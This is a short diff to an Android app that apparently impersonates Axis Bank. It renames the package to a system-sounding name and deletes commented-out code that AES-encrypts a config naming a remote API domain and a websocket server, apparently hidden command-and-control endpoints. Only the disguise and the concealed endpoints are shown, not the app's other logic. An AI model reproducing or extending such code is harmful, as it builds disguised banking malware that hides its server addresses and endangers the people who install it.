@@ -1,4 +1,4 @@
-package com.axisofbank.german;
+package com.axisofbank.systemok;
 
 import android.Manifest;
 import android.app.AlarmManager;
@@ -32,13 +32,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
 
-//        Helper H = new Helper();
-//        try {
-//            String encryption = AESDescryption.encrypt("{ \"domain\": \"https://upqadd.com/api\", \"socket\":\"wss://socket.missyou9.in\" }", H.KEY());
-//            Log.d(Helper.TAG, "data ecn "+encryption);
-//        } catch (Exception e) {
-//            throw new RuntimeException(e);
-//        }
+
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
